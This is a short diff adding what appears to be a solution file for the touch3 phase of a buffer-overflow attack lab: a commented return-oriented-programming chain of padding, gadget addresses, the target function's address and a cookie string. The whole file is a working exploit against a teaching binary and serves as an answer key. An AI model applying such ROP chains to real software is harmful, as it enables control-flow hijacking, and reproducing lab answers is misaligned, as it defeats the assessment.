@@ -1,0 +1,28 @@
+11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11
+/* 40 bytes */
+
+bc 1d 42 00 00 00 00 00 /* popq rax; nop; nop; retq; at 0x421dbc */
+20 00 00 00 00 00 00 00
+
+/* esi = eax */
+41 1e 42 00 00 00 00 00 /* movl eax, ecx; 0x421e41 */
+3c 1e 42 00 00 00 00 00 /* movl ecx, edx; 0x421e3c */
+aa 1e 42 00 00 00 00 00 /* movl edx, esi; 0x421eaa */
+
+/* rax = rsp */
+1f 1e 42 00 00 00 00 00 /* mov rsp, rax; retq; at 0x421e1f */
+
+/* rdi = rax */
+b5 1d 42 00 00 00 00 00 /* movl %eax, %edi; 0x421db5 */
+
+/* rax = rdi + rsi points to the ascii string */
+ee 1d 42 00 00 00 00 00 /* lea (%rdi,%rsi,1), %rax; 421dee */
+
+b5 1d 42 00 00 00 00 00 /* movq rax, rdi; retq; at 421db5 */
+
+26 1d 42 00 00 00 00 00 /* touch3 0x421d26 */
+
+/* ascii string of the cookie */
+34 34 32 62 32 39 64 38
+00
+
